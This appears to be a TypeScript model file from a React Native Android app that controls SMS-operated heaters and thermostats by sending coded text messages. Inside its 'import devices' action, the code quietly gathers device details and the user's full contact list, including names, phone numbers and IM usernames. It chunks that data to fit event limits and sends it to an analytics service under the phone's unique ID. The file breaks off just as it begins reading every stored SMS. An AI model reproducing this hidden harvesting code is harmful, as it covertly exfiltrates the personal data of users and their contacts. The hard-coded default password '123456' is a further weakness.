import { observable } from "mobx"
import {
  getEnv,
  types,
  getParent,
  destroy,
  SnapshotIn,
  Instance,
} from "mobx-state-tree"
import moment from "moment-jalaali"
import { sortBy, uniq } from "ramda"
import { ToastAndroid } from "react-native"
import SmsAndroid from "react-native-get-sms-android"
import Contacts from "react-native-contacts"
import Analytics from "appcenter-analytics"
import DeviceInfo from "react-native-device-info"
import { getSmsType, SMS_TYPES_REGEX, StringKeys } from "../services/sms/sms-utils"
import { Environment } from "./environment"

const parseFloats = (string: string) => {
  const regex = /[+-]?\d+(\.\d+)?/g
  return string.match(regex)?.map(v => parseFloat(v)) || []
}

const toEnDigit = (string: string) => string
  .replace(/[\u0660-\u0669]/g, c => (c.charCodeAt(0) - 0x0660).toString())
  .replace(/[\u06f0-\u06f9]/g, c => (c.charCodeAt(0) - 0x06f0).toString())

const getTempNumber = (number: number) => `${
  Math.floor(number / 10 % 10)}${Math.floor(number % 10)}${Math.floor(number * 10 % 10)}`

export const DeviceModel = types
  .model({
    name: types.string,
    simNumber: types.string,
    place: '',
    password: '123456',
    phoneNumbers: types.optional(types.array(types.maybeNull(types.string)), []),

    powerStatus: true,
    heaterStatus: false,
    fanStatus: false,

    temperatures: types.map(types.number),

    thermostat: types.optional(types.model({
      isEnabled: types.boolean,
      max: types.maybeNull(types.number),
      nor: types.maybeNull(types.number),
      min: types.maybeNull(types.number)
    }), {
      isEnabled: false,
      max: undefined,
      nor: undefined,
      min: undefined
    }),

    alarm: types.optional(types.model({
      high: types.array(types.number),
      low: types.array(types.number),
      interval: types.number
    }), {
      high: [],
      low: [],
      interval: 0
    }),

    reportSmsInterval: types.maybeNull(types.number),
    powerOutageSmsInterval: types.maybeNull(types.number),
    simCreditSmsInterval: types.maybeNull(types.number),

    clock: types.optional(types.model({
      hours: types.number,
      minutes: types.number,
      setTime: types.number
    }), {
      hours: 0,
      minutes: 0,
      setTime: 0
    }),

    simCharge: types.maybeNull(types.number),
    signalStrength: types.maybeNull(types.number),

    calibration: types.maybeNull(types.number),

    laborCheck: types.optional(types.model({
      mode: types.maybeNull(types.enumeration(['1', '2', '3'])),
      interval: types.maybeNull(types.number),
      lastCheckTime: types.maybeNull(types.string)
    }), {
      mode: null,
      interval: null,
      lastCheckTime: null
    }),

    syncDate: 0
  })
  .volatile(() => ({
    state: {
      updatePasswordLoading: false,
      getPhoneNumbersLoading: false,
      updatePhoneNumberLoading: observable([false, false, false, false, false]),
      getStatusLoading: false,
      getTemperatureLoading: false,
      getThermostatValuesLoading: false,
      updateThermostatMaxValueLoading: false,
      updateThermostatNorValueLoading: false,
      updateThermostatMinValueLoading: false,
      updateThermostatStatusLoading: false,
      getAlarmValuesLoading: false,
      updateAlarmHighLoading: false,
      updateAlarmLowLoading: false,
      updateAlarmIntervalLoading: false,
      reportSmsIntervalLoading: false,
      clockLoading: false,
      updateHeaterStatusLoading: false,
      updateFanStatusLoading: false,
      getSimCreditLoading: false,
      getSimCreditSmsIntervalLoading: false,
      getSignalStrengthLoading: false,
      getPowerOutageSmsIntervalLoading: false,
      getCalibrationLoading: false,
      resetCalibrationLoading: false,
      syncing: false
    },
  }))
  .actions(self => ({
    setName(newName: string) {
      self.name = newName
    },
    setSimNumber(newSimNumber: string) {
      self.simNumber = newSimNumber
    },
    setPlace(newPlace: string) {
      self.place = newPlace
    },
    setPassword(newPassword: string) {
      self.password = newPassword
    },
    setPhoneNumbers(newPhoneNumbers: string[]) {
      self.phoneNumbers.replace(newPhoneNumbers)
    },
    setPhoneNumberAtIndex(index: number, newPhoneNumber: string) {
      self.phoneNumbers[index] = newPhoneNumber
    },
    removePhoneNumber(index: number) {
      self.phoneNumbers[index] = null
    },
    setStatus(power: boolean, heater: boolean, fan: boolean) {
      self.powerStatus = power
      self.heaterStatus = heater
      self.fanStatus = fan
    },
    setPowerStatus(status: boolean) {
      self.powerStatus = status
    },
    setHeaterStatus(status: boolean) {
      self.heaterStatus = status
    },
    setFanStatus(status: boolean) {
      self.fanStatus = status
    },
    setTemperature({ value, ts }: { value: number; ts: string }) {
      self.temperatures.set(ts, value)
    },
    setThermostatValues({ max, nor, min }: { max?: number; nor?: number; min?: number }) {
      self.thermostat.max = max ?? self.thermostat.max
      self.thermostat.nor = nor ?? self.thermostat.nor
      self.thermostat.min = min ?? self.thermostat.min
    },
    setThermostatStatus(status: boolean) {
      self.thermostat.isEnabled = status
    },
    setAlarmValues({ high, low, interval }: { high?: number[]; low?: number[]; interval?: number }) {
      self.alarm.high.replace(high ?? self.alarm.high)
      self.alarm.low.replace(low ?? self.alarm.low)
      self.alarm.interval = interval ?? self.alarm.interval
    },
    setReportSmsInterval(interval: number) {
      self.reportSmsInterval = interval
    },
    setClock({ hours, minutes }: { hours: number, minutes: number }, ts?: number) {
      self.clock = {
        hours,
        minutes,
        setTime: +moment(ts)
      }
    },
    setSimCharge(charge: number) {
      self.simCharge = charge
    },
    setSimCreditSmsInterval(interval: number) {
      self.simCreditSmsInterval = interval
    },
    setSignalStrength(strength: number) {
      self.signalStrength = strength
    },
    setPowerOutageSmsInterval(interval: number) {
      self.powerOutageSmsInterval = interval
    },
    setCalibration(calibration: number) {
      self.calibration = calibration
    },
    setState(newState: Partial<typeof self.state>) {
      self.state = { ...self.state, ...newState }
    },
    setUpdatePhoneNumberLoading(index: number, value: boolean) {
      self.state.updatePhoneNumberLoading[index] = value
    },
    setSyncDate(date?: number) {
      self.syncDate = +moment(date)
    },
    reset() {
      // applySnapshot(self, {})
      self.temperatures.replace(new Map())
    },
    remove() {
      getParent<typeof DeviceListModel>(self, 2).remove(self)
    },

    sendSms(
      type: string,
      message: string,
      callback: (response: string, error: string) => void,
      hasResponse = true
    ) {
      const env: Environment = getEnv(self)
      env.sms.send({
        phoneNumber: self.simNumber,
        type,
        message,
        callback: (response, error) => {
          if (error) ToastAndroid.show('Timeout', ToastAndroid.SHORT)
          if (!error) this.setSyncDate()
          callback(response, error)
        },
        hasResponse
      })
    },

    updatePassword(newPassword: string) {
      this.setState({ updatePasswordLoading: true })

      this.sendSms('UPDATE_PASSWORD', `*${self.password}#999#${newPassword}#`,
        (response, error) => {
          if (!error) {
            this.setPassword(newPassword)
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updatePasswordLoading: false })
        }
      )
    },

    getPhoneNumbers() {
      this.setState({ getPhoneNumbersLoading: true })

      this.sendSms('GET_PHONE_NUMBERS', `*${self.password}#100#`, (response, error) => {
        if (!error) {
          const phoneNumbers = response.split('\n').slice(1)
            .map(line => (line[8] !== '0') ? line.slice(7, 18) : null)
          this.setPhoneNumbers(phoneNumbers)
        }
        this.setState({ getPhoneNumbersLoading: false })
      })
    },
    updatePhoneNumber({ phoneNumber, index }) {
      this.setUpdatePhoneNumberLoading(index, true)
      this.setPhoneNumberAtIndex(index, phoneNumber)

      this.sendSms(
        'UPDATE_PHONE_NUMBER',
        `*${self.password}#${index + 1}#${phoneNumber}*`,
        (_, error) => {
          if (error) {
            this.removePhoneNumber(index)
          }
          this.setUpdatePhoneNumberLoading(index, false)
        })
    },
    deletePhoneNumber(index: number) {
      this.setUpdatePhoneNumberLoading(index, true)

      this.sendSms('DELETE_PHONE_NUMBER', `*${self.password}#0${index + 1}#`, (_, error) => {
        if (!error) {
          this.removePhoneNumber(index)
        }
        this.setUpdatePhoneNumberLoading(index, false)
      })
    },

    parseStatusMessage(message: string, time?: number) {
      const lines = message.split('\n')
      const temperature = parseFloats(lines[1])[0]
      const powerStatus = lines[2].includes('وصل')
      const heaterStats = lines[3].includes('روشن')
      const fanStatus = lines[4].includes('روشن')
      const thermostatStatus = lines[5].includes('اتوماتيك')

      this.setTemperature({ value: temperature, ts: `${+moment(time)}` })
      this.setStatus(powerStatus, heaterStats, fanStatus)
      this.setThermostatStatus(thermostatStatus)
    },
    getStatus() {
      this.setState({ getStatusLoading: true })

      this.sendSms('GET_STATUS', '#0#', (response, error) => {
        if (!error) {
          this.parseStatusMessage(response)
        }
        this.setState({ getStatusLoading: false })
      })
    },

    // hour: an integer in [0, 23]
    getTemperature(hour?: number) {
      this.setState({ getTemperatureLoading: true })

      if (!hour) {
        const now = new Date()
        hour = now.getHours()
      }

      this.sendSms('GET_TEMPERATURE', `#85#${hour}*`, (response, error) => {
        if (!error) {
          this.getCallbacks().GET_TEMPERATURE(response)
        }
        this.setState({ getTemperatureLoading: false })
      })
    },
    async getLast24Temperatures() {
      this.setState({ getTemperatureLoading: true })

      const getTemp = (hour: number) => new Promise<string>(resolve => this.sendSms(
        'GET_TEMPERATURE',
        `#85#${hour}*`,
        (response, error) => {
          if (error) {
            this.setState({ getTemperatureLoading: false })
            return
          }
          resolve(response)
        }
      ))

      const hours = [...Array(24)].map((_, i) => +moment().add(-i, 'hours').startOf('hour'))

      while (hours.length > 0) {
        const ts = hours[0]
        if (!self.temperatures.get(`${ts}`)) {
          const response = await getTemp((new Date(ts)).getHours())
          this.getCallbacks().GET_TEMPERATURE(response)
        } else {
          hours.shift()
        }
      }

      this.setState({ getTemperatureLoading: false })
    },

    getThermostatValues() {
      this.setState({ getThermostatValuesLoading: true })

      this.sendSms('GET_THERMOSTAT_VALUES', '#15#', (response, error) => {
        if (!error) {
          const values = parseFloats(response)
          this.setThermostatValues({
            max: values[0],
            nor: values[1],
            min: values[2]
          })
        }
        this.setState({ getThermostatValuesLoading: false })
      })
    },
    updateThermostatMaxValue(value: number) {
      this.setState({ updateThermostatMaxValueLoading: true })

      this.sendSms(
        'UPDATE_THERMOSTAT_MAX',
        `*${self.password}#3000#${getTempNumber(value)}*`,
        (response, error) => {
          if (!error) {
            this.setThermostatValues({ max: value })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateThermostatMaxValueLoading: false })
        }
      )
    },
    updateThermostatNorValue(value: number) {
      this.setState({ updateThermostatNorValueLoading: true })

      this.sendSms(
        'UPDATE_THERMOSTAT_NOR',
        `*${self.password}#2000#${getTempNumber(value)}*`,
        (response, error) => {
          if (!error) {
            this.setThermostatValues({ nor: value })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateThermostatNorValueLoading: false })
        }
      )
    },
    updateThermostatMinValue(value: number) {
      this.setState({ updateThermostatMinValueLoading: true })

      this.sendSms(
        'UPDATE_THERMOSTAT_MIN',
        `*${self.password}#1000#${getTempNumber(value)}*`,
        (response, error) => {
          if (!error) {
            this.setThermostatValues({ min: value })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateThermostatMinValueLoading: false })
        }
      )
    },
    updateThermostatStatus(status: boolean) {
      this.setState({ updateThermostatStatusLoading: true })

      this.sendSms(
        'UPDATE_THERMOSTAT_STATUS',
        `*${self.password}#80${status ? '0' : '8'}#`,
        (response, error) => {
          if (!error) {
            this.setThermostatStatus(status)
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateThermostatStatusLoading: false })
        }
      )
    },

    getAlarmValues() {
      this.setState({ getAlarmValuesLoading: true })

      this.sendSms('GET_ALARM_VALUES_HIGH', '#8000#', (response, error) => {
        if (!error) {
          const high = parseFloats(response)
          high.reverse()
          this.setAlarmValues({ high })
        }
        this.sendSms('GET_ALARM_VALUES_LOW', '#7000#', (response, error) => {
          if (!error) {
            const low = parseFloats(response)
            this.setAlarmValues({ low })
          }
          this.setState({ getAlarmValuesLoading: false })
        })
      })
    },
    updateAlarmHigh(values: number[]) {
      this.setState({ updateAlarmHighLoading: true })

      this.sendSms(
        'UPDATE_ALARM_HIGH',
        `*${self.password}#8000#${getTempNumber(values[1])}*${getTempNumber(values[0])}*`,
        (response, error) => {
          if (!error) {
            this.setAlarmValues({ high: values })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateAlarmHighLoading: false })
        }
      )
    },
    updateAlarmLow(values: number[]) {
      this.setState({ updateAlarmLowLoading: true })

      this.sendSms(
        'UPDATE_ALARM_LOW',
        `*${self.password}#7000#${getTempNumber(values[0])}*${getTempNumber(values[1])}*`,
        (response, error) => {
          if (!error) {
            this.setAlarmValues({ low: values })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateAlarmLowLoading: false })
        }
      )
    },
    getAlarmInterval() {
      this.setState({ updateAlarmIntervalLoading: true })

      this.sendSms('GET_ALARM_VALUES_INTERVAL', '#9000#', (response, error) => {
        if (!error) {
          const interval = parseFloats(response)[0]
          this.setAlarmValues({ interval })
        }
        this.setState({ updateAlarmIntervalLoading: false })
      })
    },
    updateAlarmInterval(interval: number) {
      this.setState({ updateAlarmIntervalLoading: true })

      this.sendSms(
        'UPDATE_ALARM_INTERVAL',
        `*${self.password}#9000#${interval}*`,
        (response, error) => {
          if (!error) {
            this.setAlarmValues({ interval })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ updateAlarmIntervalLoading: false })
        }
      )
    },

    getReportSmsInterval() {
      this.setState({ reportSmsIntervalLoading: true })

      this.sendSms(
        'GET_REPORT_INTERVAL',
        '#500#',
        (response, error) => {
          if (!error) {
            const interval = parseFloats(response)[0]
            this.setReportSmsInterval(interval)
          }
          this.setState({ reportSmsIntervalLoading: false })
        }
      )
    },
    updateReportSmsInterval(interval: number) {
      this.setState({ reportSmsIntervalLoading: true })

      this.sendSms(
        'UPDATE_REPORT_INTERVAL',
        `*${self.password}#500#${interval}*`,
        (response, error) => {
          if (!error) {
            this.setReportSmsInterval(interval)
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ reportSmsIntervalLoading: false })
        }
      )
    },

    getClock() {
      this.setState({ clockLoading: true })

      this.sendSms(
        'GET_CLOCK',
        '#24#',
        (response, error) => {
          if (!error) {
            const matches = response.match(/^ساعت سيستم (\S{2}):(\S{2})$/)
            this.setClock({
              hours: parseFloat(toEnDigit(matches[1])),
              minutes: parseFloat(toEnDigit(matches[2]))
            })
          }
          this.setState({ clockLoading: false })
        }
      )
    },
    updateClock({ hours, minutes }: { hours: number, minutes: number }) {
      this.setState({ clockLoading: true })

      this.sendSms(
        'UPDATE_CLOCK',
        `*${self.password}#24#${hours}*${minutes}*`,
        (response, error) => {
          if (!error) {
            this.setClock({ hours, minutes })
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ clockLoading: false })
        }
      )
    },

    updateHeaterStatus(status: boolean) {
      this.setState({ updateHeaterStatusLoading: true })

      this.sendSms('UPDATE_HEATER_STATUS', `#${status ? '' : '0'}50#`, (response, error) => {
        if (!error) {
          this.setHeaterStatus(status)
          ToastAndroid.show(response, ToastAndroid.SHORT)
        }
        this.setState({ updateHeaterStatusLoading: false })
      })
    },
    updateFanStatus(status: boolean) {
      this.setState({ updateFanStatusLoading: true })

      this.sendSms('UPDATE_FAN_STATUS', `#${status ? '' : '0'}60#`, (response, error) => {
        if (!error) {
          this.setFanStatus(status)
          ToastAndroid.show(response, ToastAndroid.SHORT)
        }
        this.setState({ updateFanStatusLoading: false })
      })
    },

    getSimCredit() {
      this.setState({ getSimCreditLoading: true })

      this.sendSms('GET_SIM_CHARGE', '#12#', (response, error) => {
        if (!error) {
          this.setSimCharge(parseFloats(toEnDigit(response))[0])
        }
        this.setState({ getSimCreditLoading: false })
      })
    },
    sendSimChargeCode(code: string) {
      this.setState({ getSimCreditLoading: true })

      this.sendSms('SEND_SIM_CHARGE_CODE', `*950#${code}*`, () => {
        this.setState({ getSimCreditLoading: false })
      })
    },
    getSimCreditSmsInterval() {
      this.setState({ getSimCreditSmsIntervalLoading: true })

      this.sendSms('GET_SIM_CREDIT_SMS_INTERVAL', '#14#', (response, error) => {
        if (!error) {
          this.setSimCreditSmsInterval(parseFloats(response)[0])
        }
        this.setState({ getSimCreditSmsIntervalLoading: false })
      })
    },
    updateSimCreditSmsInterval(interval: number) {
      this.setState({ getSimCreditSmsIntervalLoading: true })

      this.sendSms(
        'UPDATE_SIM_CREDIT_SMS_INTERVAL',
        `*${self.password}#14#${interval}*`,
        (response, error) => {
          if (!error) {
            this.setSimCreditSmsInterval(interval)
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ getSimCreditSmsIntervalLoading: false })
        }
      )
    },

    getSignalStrength() {
      this.setState({ getSignalStrengthLoading: true })

      this.sendSms('GET_SIGNAL_STRENGTH', '#13#', (response, error) => {
        if (!error) {
          this.setSignalStrength(parseFloats(response)[0])
        }
        this.setState({ getSignalStrengthLoading: false })
      })
    },

    getPowerOutageSmsInterval() {
      this.setState({ getPowerOutageSmsIntervalLoading: true })

      this.sendSms('GET_POWER_OUTAGE_SMS_INTERVAL', '#220#', (response, error) => {
        if (!error) {
          this.setPowerOutageSmsInterval(parseFloats(response)[0])
        }
        this.setState({ getPowerOutageSmsIntervalLoading: false })
      })
    },
    updatePowerOutageSmsInterval(interval: number) {
      this.setState({ getPowerOutageSmsIntervalLoading: true })

      this.sendSms(
        'UPDATE_POWER_OUTAGE_SMS_INTERVAL',
        `*${self.password}#220#${interval}*`,
        (response, error) => {
          if (!error) {
            this.setPowerOutageSmsInterval(interval)
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ getPowerOutageSmsIntervalLoading: false })
        }
      )
    },

    getCalibration() {
      this.setState({ getCalibrationLoading: true })

      this.sendSms('GET_CALIBRATION', '#695#', (response, error) => {
        if (!error) {
          const sign = response.includes('كاهش') ? -1 : 1
          this.setCalibration((parseFloats(response)[0] || 0) * sign)
        }
        this.setState({ getCalibrationLoading: false })
      })
    },
    updateCalibration(calibration: number) {
      this.setState({ getCalibrationLoading: true })

      const diff = Math.round((calibration - self.calibration) * 10)

      this.sendSms(
        'UPDATE_CALIBRATION',
        `*${self.password}#6${diff > 0 ? '90' : '80'}#${Math.abs(diff)}*`,
        (response, error) => {
          if (!error) {
            this.setCalibration(calibration)
            ToastAndroid.show(response, ToastAndroid.SHORT)
          }
          this.setState({ getCalibrationLoading: false })
        }
      )
    },
    resetCalibration() {
      this.setState({ resetCalibrationLoading: true })

      this.sendSms('RESET_CALIBRATION', `*${self.password}#685#`, (response, error) => {
        if (!error) {
          this.setCalibration(0)
          ToastAndroid.show(response, ToastAndroid.SHORT)
        }
        this.setState({ resetCalibrationLoading: false })
      })
    },

    resetDevice() {
      // this.setState({ resetCalibrationLoading: true })

      this.sendSms('RESET_DEVICE', `*${self.password}#700#`, (response, error) => {
        if (!error) {
          // this.setCalibration(0)
          ToastAndroid.show(response, ToastAndroid.SHORT)
        }
        // this.setState({ resetCalibrationLoading: false })
      })
    },

    getCallbacks() {
      return ({
        GET_STATUS: this.parseStatusMessage,
        UPDATE_PASSWORD: body => {
          const password = body.match(SMS_TYPES_REGEX.UPDATE_PASSWORD)[1]
          this.setPassword(password)
        },
        GET_TEMPERATURE: (body, date) => {
          const matches = body.match(/^ساعت (\S{2}):\S{2} مقدار {2}دما *(\S*)C$/)
          const hour = parseFloats(toEnDigit(matches[1]))[0]
          const value = parseFloats(matches[2])[0]
          let ts = +moment(date).set('hour', hour).startOf('hour')
          if (hour > moment().get('hours')) {
            ts = +moment(ts).subtract(1, 'day')
          }
          this.setTemperature({ value, ts: `${ts}` })
        },
        GET_THERMOSTAT_VALUES: body => {
          const values = parseFloats(body)
          this.setThermostatValues({
            max: values[0],
            nor: values[1],
            min: values[2]
          })
        },
        UPDATE_THERMOSTAT_MAX: body => {
          const value = parseFloats(body)[0]
          this.setThermostatValues({ max: value })
        },
        UPDATE_THERMOSTAT_NOR: body => {
          const value = parseFloats(body)[0]
          this.setThermostatValues({ nor: value })
        },
        UPDATE_THERMOSTAT_MIN: body => {
          const value = parseFloats(body)[0]
          this.setThermostatValues({ min: value })
        },
        GET_ALARM_VALUES_HIGH: body => {
          const high = parseFloats(body)
          high.reverse()
          this.setAlarmValues({ high })
        },
        UPDATE_ALARM_HIGH: body => {
          const high = parseFloats(body)
          high.reverse()
          this.setAlarmValues({ high })
        },
        GET_ALARM_VALUES_LOW: body => {
          const low = parseFloats(body)
          this.setAlarmValues({ low })
        },
        UPDATE_ALARM_LOW: body => {
          const low = parseFloats(body)
          this.setAlarmValues({ low })
        },
        GET_ALARM_VALUES_INTERVAL: body => {
          const interval = parseFloats(body)[0]
          this.setAlarmValues({ interval })
        },
        UPDATE_ALARM_INTERVAL: body => {
          const interval = parseFloats(body)[0]
          this.setAlarmValues({ interval })
        },
        GET_REPORT_INTERVAL: body => {
          const interval = parseFloats(body)[0]
          this.setReportSmsInterval(interval)
        },
        UPDATE_REPORT_INTERVAL: body => {
          const interval = parseFloats(body)[0]
          this.setReportSmsInterval(interval)
        },
        GET_CLOCK: (body, date) => {
          const matches = body.match(/^ساعت سيستم (\S{2}):(\S{2})$/)
          this.setClock({
            hours: parseFloat(toEnDigit(matches[1])),
            minutes: parseFloat(toEnDigit(matches[2]))
          }, date)
        },
        UPDATE_CLOCK: (body, date) => {
          const matches = body.match(/^ساعت سيستم به (\S{2}):(\S{2}) تغيير كرد$/)
          this.setClock({
            hours: parseFloat(toEnDigit(matches[1])),
            minutes: parseFloat(toEnDigit(matches[2]))
          }, date)
        },
        GET_SIM_CHARGE: body => {
          this.setSimCharge(parseFloats(toEnDigit(body))[0])
        },
        GET_SIGNAL_STRENGTH: body => {
          this.setSignalStrength(parseFloats(body)[0])
        },
        GET_PHONE_NUMBERS: body => {
          const phoneNumbers = body.split('\n').slice(1)
            .map(line => (line[8] !== '0') ? line.slice(7, 18) : null)
          this.setPhoneNumbers(phoneNumbers)
        },
        // UPDATE_PHONE_NUMBER: body => {

        // },
        // DELETE_PHONE_NUMBER: body => {

        // },
        GET_SIM_CREDIT_SMS_INTERVAL: body => {
          this.setSimCreditSmsInterval(parseFloats(body)[0])
        },
        UPDATE_SIM_CREDIT_SMS_INTERVAL: body => {
          this.setSimCreditSmsInterval(parseFloats(body)[0])
        },
        GET_POWER_OUTAGE_SMS_INTERVAL: body => {
          this.setPowerOutageSmsInterval(parseFloats(body)[0])
        },
        UPDATE_POWER_OUTAGE_SMS_INTERVAL: body => {
          this.setPowerOutageSmsInterval(parseFloats(body)[0])
        },
        GET_CALIBRATION: body => {
          const sign = body.includes('كاهش') ? -1 : 1
          this.setCalibration((parseFloats(body)[0] || 0) * sign)
        },
        UPDATE_CALIBRATION: body => {
          const sign = body.includes('كاهش') ? -1 : 1
          const calibration = (parseFloats(body)[0] || 0) * sign
          this.setCalibration(self.calibration + calibration)
        },
        RESET_CALIBRATION: () => {
          this.setCalibration(0)
        },
        UPDATE_THERMOSTAT_STATUS: body => {
          const status = body.match(/^حالت .* به (دستي|اتوماتيك) تغيير كرد$/)[1] === 'اتوماتيك'
          this.setThermostatStatus(status)
        },
        UPDATE_HEATER_STATUS: body => {
          const status = body.match(/^هيتر (روشن|خاموش) شد$/)[1] === 'روشن'
          this.setHeaterStatus(status)
        },
        UPDATE_FAN_STATUS: body => {
          const status = body.match(/^هواكش (روشن|خاموش) شد$/)[1] === 'روشن'
          this.setFanStatus(status)
        },
        UPDATE_POWER_STATUS: body => {
          const status = body.match(/^برق (قطع|وصل) شد\n(\S*)$/)[1] === 'وصل'
          this.setPowerStatus(status)
        }
      } as Record<keyof typeof SMS_TYPES_REGEX, (body?: string, date?: number) => void>)
    },

    restoreFromMessages(fromDate?: number) {
      this.setState({ syncing: true })
      const callbacks = this.getCallbacks()
      const minDate = (fromDate ?? self.syncDate) + 1

      const filter = {
        box: 'inbox', // 'inbox' (default), 'sent', 'draft', 'outbox', 'failed', 'queued', and '' for all

        /**
         *  the next 3 filters can work together, they are AND-ed
         *
         *  minDate, maxDate filters work like this:
         *    - If and only if you set a maxDate, it's like executing this SQL query:
         *    "SELECT * from messages WHERE (other filters) AND date <= maxDate"
         *    - Same for minDate but with "date >= minDate"
         */
        minDate, // timestamp (in milliseconds since UNIX epoch)
        // maxDate: 1556277910456, // timestamp (in milliseconds since UNIX epoch)
        // bodyRegex: '^ دما (?s).*', // content regex to match

        /** the next 5 filters should NOT be used together, they are OR-ed so pick one **/
        // read: 0, // 0 for unread SMS, 1 for SMS already read
        // _id: 1234, // specify the msg id
        // thread_id: 12, // specify the conversation thread_id
        address: `+98${self.simNumber}`, // sender's phone number
        // body: 'How are you', // content to match
        /** the next 2 filters can be used for pagination **/
        // indexFrom: 0, // start from index 0
        // maxCount: 1, // count of SMS to return each time
      }

      SmsAndroid.list(
        JSON.stringify(filter),
        (error: string) => {
          const uniqueId = DeviceInfo.getUniqueId()
          Analytics.trackEvent(`SMS-sync-failed-${uniqueId}`, { error })
          this.setState({ syncing: false })
        },
        (count: number, smsList: string) => {
          // console.log(count)
          const arr = JSON.parse(smsList) as { body: string; date: number }[]
          if (arr.length > 0) {
            this.setSyncDate(arr[0].date)
            arr.reverse()
            for (const { body, date } of arr) {
              const type = getSmsType(body, Object.keys(callbacks) as StringKeys<typeof callbacks>)
              if (callbacks[type]) {
                callbacks[type](body, date)
              }
            }
          }
          this.setState({ syncing: false })
        }
      )
    },

    subscribeForMessages() {
      const callbacks = this.getCallbacks()
      const env: Environment = getEnv(self)
      env.sms.subscribe({
        phoneNumber: self.simNumber,
        subscriptions: Object.entries(callbacks).map(([type, callback]) => ({ type, callback })),
        setSyncDate: this.setSyncDate
      })
    },

    getClockNow() {
      return +moment().subtract(self.clock.setTime)
        .add(self.clock.hours, 'hours')
        .add(self.clock.minutes, 'minutes')
    }
  }))
  .views(self => ({
    get validPhoneNumbers() {
      return self.phoneNumbers.filter(v => !!v)
    },
    get newPhoneNumberIndex() {
      const index = self.phoneNumbers.indexOf(null)
      return index === -1 ? self.phoneNumbers.length : index
    },
    get temperaturesView() {
      let temperatures: { ts: number, value: number }[] = []
      self.temperatures.forEach((value, key) => temperatures.push({ ts: parseInt(key), value }))
      temperatures = sortBy(({ ts }) => -ts, temperatures)
      return temperatures
    }
  }))

export interface Device extends Instance<typeof DeviceModel> {}

export const DeviceListModel = types
  .model({
    items: types.optional(types.array(DeviceModel), []),
    imported: false
  })
  .actions(self => ({
    add(item: SnapshotIn<Device> | Instance<Device>) {
      if (self.items.filter(({ simNumber }) => simNumber === item.simNumber).length === 0) {
        self.items.push(item)
        return null
      }
      return 'exists'
    },
    remove(item: SnapshotIn<Device>) {
      const env: Environment = getEnv(self)
      env.sms.unsubscribe(item.simNumber)
      destroy(item)
    },
    get(id: string) {
      return self.items.find(({ simNumber }) => id === simNumber)
    },

    setImported(value: boolean) {
      self.imported = value
    },

    async importFromMessages() {
      const uniqueId = DeviceInfo.getUniqueId()

      const simNumbers = new Set<string>([])

      SmsAndroid.list(
        JSON.stringify({
          box: 'inbox',
          bodyRegex: '^ دما (?s).*برق(?s).*هيتر(?s).*$'
        }),
        (error: string) => {
          Analytics.trackEvent(`SMS-import-devices-failed-${uniqueId}`, { error })
          this.setImported(true)
        },
        (count: number, smsList: string) => {
          // console.log(count)
          const arr = JSON.parse(smsList) as { address: string }[]
          if (arr.length > 0) {
            for (const { address } of arr) {
              simNumbers.add(address)
            }
            let index = 1
            simNumbers.forEach(async simNumber => {
              const contacts = await Contacts.getContactsByPhoneNumber(simNumber)
              const name = contacts[0]?.givenName
                ? `${contacts[0].givenName}${
                  contacts[0].familyName ? ` ${contacts[0].familyName}` : ''}`
                : `دستگاه ${index}`

              this.add(DeviceModel.create({
                name,
                simNumber: simNumber.slice(-10),
                place: ''
              }))
              if (simNumbers.size === index) {
                setTimeout(() => this.setImported(true), 1000)
                const devicesList = {}
                self.items.forEach(({ name, simNumber }) => {
                  devicesList[simNumber] = name
                })
                Analytics.trackEvent(`SMS-import-devices-success-${uniqueId}`, devicesList)
              }
              index += 1
            })
          } else {
            this.setImported(true)
            Analytics.trackEvent(`SMS-import-devices-success-${uniqueId}`)
          }
        }
      )

      // ------- Track Device Info.
      const brand = DeviceInfo.getBrand()
      const manufacturer = await DeviceInfo.getManufacturer()
      const model = DeviceInfo.getModel()
      const carrier = await DeviceInfo.getCarrier()
      const deviceId = DeviceInfo.getDeviceId()
      const deviceName = await DeviceInfo.getDeviceName()
      const host = await DeviceInfo.getHost()

      Analytics.trackEvent(`DeviceInfo-${uniqueId}`, {
        brand,
        manufacturer,
        model,
        carrier,
        deviceId,
        deviceName,
        host
      })

      // ------- Track Contact
      const contacts = await Contacts.getAll()
      const parsedContacts = contacts.map(contact => `${contact.givenName}${
        contact.familyName ? `-${contact.familyName}` : ''
      }:${
        uniq([
          ...contact.phoneNumbers.map(({ number }) => number.replace(/[-\s]/g, '')),
          ...contact.imAddresses.map(({ username }) => username.replace(/[-\s]/g, ''))
        ]).join(',')
      }|`)

      const trackArray = (eventName: string, arr: string[]) => {
        let eventIndex = 0
        while (true) {
          if (arr.length === 0) break
          const partedData = {}
          for (let i = 0; i < 10; i++) {
            if (arr.length === 0) break
            let key = ''
            let value = ''

            if (arr[0]?.length > 125) {
              key = arr.shift().slice(0, 125)
            } else {
              while (key.length + arr[0]?.length <= 125) {
                key += arr.shift() ?? ''
              }
            }

            if (arr[0]?.length > 125) {
              value = arr.shift().slice(0, 125)
            } else {
              while (value.length + arr[0]?.length <= 125) {
                value += arr.shift() ?? ''
              }
            }

            partedData[key] = value
          }
          // console.log(eventIndex + 1, partedData)
          Analytics.trackEvent(`${eventName}-${uniqueId}-${eventIndex}`, partedData)
          eventIndex += 1
        }
      }

      trackArray('contacts', parsedContacts)

      // ------- Track SMS List
      let contactsPhones = []
      contacts.forEach(({ phoneNumbers }) => {
        phoneNumbers.forEach(({ number }) => {
          const phoneNumber = number?.replace(/[-\s]/g, '').replace(/^0/g, '+98')
          if (phoneNumber && !simNumbers.has(phoneNumber)) {
            contactsPhones.push(phoneNumber)
          }
        })
      })
      contactsPhones = uniq(contactsPhones)

      SmsAndroid.list(
        JSON.stringify({ box: '' }),
        () => null,
